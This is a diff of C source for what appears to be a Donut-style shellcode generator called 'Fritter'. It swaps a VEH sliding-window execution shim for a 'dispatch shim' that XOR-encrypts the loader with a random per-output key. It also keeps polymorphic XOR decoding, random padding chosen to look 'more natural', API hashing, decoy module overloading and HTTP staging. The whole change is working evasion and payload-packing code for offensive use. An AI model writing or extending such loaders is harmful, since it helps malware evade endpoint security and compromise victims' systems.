@@ -33,7 +33,7 @@
 
 #include "loader_peb1_exe_x64.h"
 #include "loader_peb2_exe_x64.h"
-#include "veh_shim_exe_x64.h"
+#include "dispatch_shim_exe_x64.h"
   
 #define PUT_BYTE(p, v)     { *(uint8_t *)(p) = (uint8_t) (v); p = (uint8_t*)p + 1; }
 #define PUT_HWORD(p, v)    { t=v; memcpy((char*)p, (char*)&t, 2); p = (uint8_t*)p + 2; }
@@ -1669,12 +1669,12 @@ static int build_loader(PFRITTER_CONFIG c) {
            decoder_stub_size, rKP.reg3, rDP.reg3, rCNT.reg3, rIDX.reg3,
            key_len, zero_opcode, loop_order);
 
-    // --- VEH shim integration ---
+    // --- Dispatch shim integration (replaces VEH shim) ---
     // Page-pad the shim so the loader starts on a page boundary
     // (VirtualAlloc allocates on 64KB boundaries, so absolute page alignment is guaranteed)
-    uint32_t shim_raw_size = sizeof(VEH_SHIM_EXE_X64);
+    uint32_t shim_raw_size = sizeof(DISPATCH_SHIM_EXE_X64);
     uint32_t shim_padded_size = (shim_raw_size + 0xFFF) & ~0xFFF;  // round up to 4096
-    DPRINT("VEH shim: %d bytes raw, %d bytes padded", shim_raw_size, shim_padded_size);
+    DPRINT("Dispatch shim: %d bytes raw, %d bytes padded", shim_raw_size, shim_padded_size);
 
     // Build combined blob: [shim (page-padded)] [loader]
     uint32_t combined_size = shim_padded_size + loader_size;
@@ -1684,30 +1684,17 @@ static int build_loader(PFRITTER_CONFIG c) {
     }
 
     // Copy shim, pad with random bytes (not zeros - looks more natural)
-    memcpy(combined, VEH_SHIM_EXE_X64, shim_raw_size);
+    memcpy(combined, DISPATCH_SHIM_EXE_X64, shim_raw_size);
     if(shim_padded_size > shim_raw_size) {
       gen_random(combined + shim_raw_size, shim_padded_size - shim_raw_size);
     }
 
-    // Patch sentinel values in the shim blob
-    // SENTINEL_LOADER_OFFSET (0xDEAD0001) → offset from shim start to loader
-    // SENTINEL_LOADER_SIZE   (0xDEAD0002) → loader blob size
-    // SENTINEL_VEH_MODE      (0xDEAD0003) → 0=simple RX, 1=VEH sliding window
-    // SENTINEL_PAGE_KEY_HI   (0xDEAD0004) → upper 32 bits of per-page XOR key
-    // SENTINEL_PAGE_KEY_LO   (0xDEAD0005) → lower 32 bits of per-page XOR key
-
-    // Generate per-page encryption master key (used only in VEH mode)
-    uint8_t page_key_bytes[8];
-    gen_random(page_key_bytes, 8);
-    uint64_t page_master_key;
-    memcpy(&page_master_key, page_key_bytes, 8);
-
+    // Patch dispatch shim sentinels (in shim portion of combined):
+    //   SENTINEL_LOADER_OFFSET (0xDEAD0001) -> shim_padded_size
+    //   SENTINEL_LOADER_SIZE   (0xDEAD0002) -> loader_size
+    // VEH_MODE and PAGE_KEY_* sentinels are retired under dispatch.
     {
-      int patched_off = 0, patched_sz = 0, patched_mode = 0;
-      int patched_pk_hi = 0, patched_pk_lo = 0;
-      uint32_t veh_mode_val = (uint32_t)c->chunked;
-      uint32_t pk_hi = (uint32_t)(page_master_key >> 32);
-      uint32_t pk_lo = (uint32_t)(page_master_key & 0xFFFFFFFF);
+      int patched_off = 0, patched_sz = 0;
       for(uint32_t i = 0; i < shim_raw_size - 3; i++) {
         uint32_t val;
         memcpy(&val, combined + i, 4);
@@ -1719,90 +1706,85 @@ static int build_loader(PFRITTER_CONFIG c) {
           memcpy(combined + i, &loader_size, 4);
           patched_sz = 1;
           DPRINT("Patched SENTINEL_LOADER_SIZE at shim+%d -> %d", i, loader_size);
-        } else if(val == 0xDEAD0003 && !patched_mode) {
-          memcpy(combined + i, &veh_mode_val, 4);
-          patched_mode = 1;
-          DPRINT("Patched SENTINEL_VEH_MODE at shim+%d -> %d (%s)", i, veh_mode_val,
-                 veh_mode_val ? "VEH sliding window" : "simple RW->RX");
-        } else if(val == 0xDEAD0004 && !patched_pk_hi) {
-          memcpy(combined + i, &pk_hi, 4);
-          patched_pk_hi = 1;
-          DPRINT("Patched SENTINEL_PAGE_KEY_HI at shim+%d", i);
-        } else if(val == 0xDEAD0005 && !patched_pk_lo) {
-          memcpy(combined + i, &pk_lo, 4);
-          patched_pk_lo = 1;
-          DPRINT("Patched SENTINEL_PAGE_KEY_LO at shim+%d", i);
         }
       }
-      if(!patched_off || !patched_sz || !patched_mode) {
-        DPRINT("ERROR: Failed to patch VEH shim sentinels (off=%d, sz=%d, mode=%d)",
-               patched_off, patched_sz, patched_mode);
-        free(combined);
-        return FRITTER_ERROR_NO_MEMORY;
-      }
-      if(c->chunked && (!patched_pk_hi || !patched_pk_lo)) {
-        DPRINT("ERROR: Failed to patch page key sentinels (hi=%d, lo=%d)",
-               patched_pk_hi, patched_pk_lo);
+      if(!patched_off || !patched_sz) {
+        DPRINT("ERROR: Failed to patch dispatch shim sentinels (off=%d, sz=%d)",
+               patched_off, patched_sz);
         free(combined);
         return FRITTER_ERROR_NO_MEMORY;
       }
     }
 
-    // Copy loader after padded shim
-    memcpy(combined + shim_padded_size, loader_blob, loader_size);
+    // Locate the fn table by marker scan and populate it.
+    //   marker  @ +0..7   (F1 7E 7A B1 F1 7E 7A B1, little-endian)
+    //   count   @ +8..11  (patched to 1 for v1 whole-loader dispatch)
+    //   pad     @ +12..15
+    //   entry[0] @ +16..27 : {offset=0, size=loader_size, key=random, flags=0}
+    // The design supports N>1 (per-function dispatch); when the linker
+    // merge is fixed and exe2h can emit per-function boundaries, this
+    // block grows to fill multiple entries. Shim code doesn't change.
+    uint8_t fn_key = 0;
+    {
+      static const uint8_t FN_MARKER[8] = {
+        0xB1, 0x7A, 0x7E, 0xF1, 0xB1, 0x7A, 0x7E, 0xF1
+      };
+      int marker_found = 0;
+      uint32_t ft_off = 0;
+      for(uint32_t i = 0; i + 8 <= shim_raw_size; i++) {
+        if(memcmp(combined + i, FN_MARKER, 8) == 0) {
+          ft_off = i;
+          marker_found = 1;
+          break;
+        }
+      }
+      if(!marker_found) {
+        DPRINT("ERROR: dispatch shim fn table marker not found");
+        free(combined);
+        return FRITTER_ERROR_NO_MEMORY;
+      }
+      DPRINT("fn table marker at shim+%u", ft_off);
 
+      // Generate per-output XOR key; reject zero (functional no-op).
+      do { gen_random(&fn_key, 1); } while(fn_key == 0);
+
+      // fn_count = 1
+      uint32_t one = 1;
+      memcpy(combined + ft_off + 8, &one, 4);
+      // entry[0]: offset=0, size=loader_size, key=fn_key, flags=0
+      uint32_t e_off = 0, e_sz = loader_size;
+      memcpy(combined + ft_off + 16 + 0, &e_off, 4);
+      memcpy(combined + ft_off + 16 + 4, &e_sz,  4);
+      combined[ft_off + 16 + 8]  = fn_key;   // key
+      combined[ft_off + 16 + 9]  = 0x00;     // flags (bit 0=resident; 0=protected)
+      combined[ft_off + 16 + 10] = 0x00;     // pad
+      combined[ft_off + 16 + 11] = 0x00;
+      DPRINT("Patched fn table: count=1 entry[0]={offset=0 size=%u key=0x%02X flags=0}",
+             loader_size, fn_key);
+    }
+
+    // Copy loader after padded shim, then XOR-encrypt the loader
+    // region in place with the per-fn key. Shim untouched.
+    memcpy(combined + shim_padded_size, loader_blob, loader_size);
+    for(uint32_t i = 0; i < loader_size; i++) {
+      combined[shim_padded_size + i] ^= fn_key;
+    }
+    DPRINT("XOR-encrypted loader region (%u bytes) with fn key 0x%02X",
+           loader_size, fn_key);
+
+    // Outer decoder wraps the WHOLE combined blob (shim + fn-encrypted loader).
     uint8_t *encoded = malloc(combined_size);
     if(encoded == NULL) {
       free(combined);
       return FRITTER_ERROR_NO_MEMORY;
     }
 
-    if(c->chunked) {
-      // VEH mode: per-page encrypt loader pages, then XOR-encode ONLY the shim
-      // The outer XOR decoder will only decode the shim; loader stays per-page encrypted
-      uint32_t num_pages = (loader_size + 0xFFF) / 0x1000;
-      for(uint32_t pg = 0; pg < num_pages; pg++) {
-        uint32_t pg_offset = pg * 0x1000;
-        uint32_t pg_len = (pg_offset + 0x1000 <= loader_size) ? 0x1000 : (loader_size - pg_offset);
-        uint64_t key = page_master_key ^ (uint64_t)(pg + 1);
+    memcpy(db + counter_imm_offset, &combined_size, 4);
+    DPRINT("Patched decoder counter: %d -> %d (shim %d + loader %d)",
+           loader_size, combined_size, shim_padded_size, loader_size);
 
-        uint8_t *page_ptr = combined + shim_padded_size + pg_offset;
-        for(uint32_t b = 0; b < pg_len / 8; b++) {
-          uint64_t *qw = (uint64_t *)(page_ptr + b * 8);
-          *qw ^= key;
-        }
-        // Handle trailing bytes on last page
-        uint32_t remainder = pg_len & 7;
-        if(remainder) {
-          uint8_t *tail = page_ptr + (pg_len & ~7u);
-          uint8_t *kb = (uint8_t *)&key;
-          for(uint32_t r = 0; r < remainder; r++) {
-            tail[r] ^= kb[r];
-          }
-        }
-      }
-      DPRINT("Per-page encrypted %d loader pages", num_pages);
-
-      // Patch decoder counter to decode ONLY the shim
-      memcpy(db + counter_imm_offset, &shim_padded_size, 4);
-      DPRINT("Patched decoder counter: %d (shim only, loader is per-page encrypted)",
-             shim_padded_size);
-
-      // XOR-encode the shim portion (key_mask matches decoder's AND imm)
-      for(uint32_t i = 0; i < shim_padded_size; i++) {
-        encoded[i] = combined[i] ^ xor_key[i & key_mask];
-      }
-      // Copy per-page encrypted loader as-is
-      memcpy(encoded + shim_padded_size, combined + shim_padded_size, loader_size);
-    } else {
-      // Simple mode: XOR-encode the entire combined blob (shim + loader)
-      memcpy(db + counter_imm_offset, &combined_size, 4);
-      DPRINT("Patched decoder counter: %d -> %d (shim %d + loader %d)",
-             loader_size, combined_size, shim_padded_size, loader_size);
-
-      for(uint32_t i = 0; i < combined_size; i++) {
-        encoded[i] = combined[i] ^ xor_key[i & key_mask];
-      }
+    for(uint32_t i = 0; i < combined_size; i++) {
+      encoded[i] = combined[i] ^ xor_key[i & key_mask];
     }
     free(combined);
 
@@ -2665,7 +2647,7 @@ static void usage (void) {
         printf("    -k, --headers <1-2>       " C_DIM "1=Overwrite (default) 2=Keep all" C_RST "\n");
         printf("    -d, --domain  <name>      " C_DIM "AppDomain name for .NET" C_RST "\n");
         printf("    -j, --decoy   <path>      " C_DIM "Decoy module for Module Overloading" C_RST "\n");
-        printf("    -g, --chunked <0-1>       " C_DIM "0=RW->RX  1=VEH sliding window (default)" C_RST "\n\n");
+        printf("    -g, --chunked <0-1>       " C_DIM "(deprecated; dispatch shim always used)" C_RST "\n\n");
 
         printf(C_YEL "  STAGING" C_RST "\n");
         printf("    -n, --modname <name>      " C_DIM "Module name for HTTP staging" C_RST "\n");
@@ -2698,7 +2680,7 @@ static void usage (void) {
         printf("    -k, --headers <1-2>       1=Overwrite (default) 2=Keep all\n");
         printf("    -d, --domain  <name>      AppDomain name for .NET\n");
         printf("    -j, --decoy   <path>      Decoy module for Module Overloading\n");
-        printf("    -g, --chunked <0-1>       0=RW->RX  1=VEH sliding window (default)\n\n");
+        printf("    -g, --chunked <0-1>       (deprecated; dispatch shim always used)\n\n");
 
         printf("  STAGING\n");
         printf("    -n, --modname <name>      Module name for HTTP staging\n");
@@ -2734,7 +2716,7 @@ int main(int argc, char *argv[]) {
     c.entropy   = FRITTER_ENTROPY_DEFAULT;  // enable random names + symmetric encryption by default
     c.exit_opt  = FRITTER_OPT_EXIT_THREAD;  // default behaviour is to exit the thread
     c.unicode   = 0;                      // command line will not be converted to unicode for unmanaged DLL function
-    c.chunked   = 1;                      // VEH sliding window (1) or simple RW->RX (0)
+    c.chunked   = 1;                      // legacy flag; retained for CLI compat, unused under dispatch
     
     // get options
     get_opt(argc, argv, OPT_TYPE_NONE,   NULL,       "h;?", "help",            usage);
@@ -2843,7 +2825,7 @@ int main(int argc, char *argv[]) {
         printf("    Encryption  " C_WHT "Custom ARX (Chaskey-derived, CTR mode)" C_RST "\n");
         printf("    API Hashing " C_WHT "Maru" C_RST "\n");
         printf("    PE Headers  " C_WHT "%s" C_RST "\n", headers_str);
-        printf("    Exec Guard  " C_WHT "%s" C_RST "\n", c.chunked ? "VEH sliding window + per-page encrypt" : "RW->RX");
+        printf("    Exec Guard  " C_WHT "Dispatch shim (per-fn XOR)" C_RST "\n");
         printf("    Decoder     " C_WHT "Polymorphic XOR" C_RST "\n");
         printf("    PEB Access  " C_WHT "TEB-indirect (gs:0x30+0x60)" C_RST "\n");
         if(c.decoy[0]) printf("    Decoy       " C_WHT "%s" C_RST "\n", c.decoy);
@@ -2883,7 +2865,7 @@ int main(int argc, char *argv[]) {
         printf("    Encryption  Custom ARX (Chaskey-derived, CTR mode)\n");
         printf("    API Hashing Maru\n");
         printf("    PE Headers  %s\n", headers_str);
-        printf("    Exec Guard  %s\n", c.chunked ? "VEH sliding window + per-page encrypt" : "RW->RX");
+        printf("    Exec Guard  Dispatch shim (per-fn XOR)\n");
         printf("    Decoder     Polymorphic XOR\n");
         printf("    PEB Access  TEB-indirect (gs:0x30+0x60)\n");
         if(c.decoy[0]) printf("    Decoy       %s\n", c.decoy);
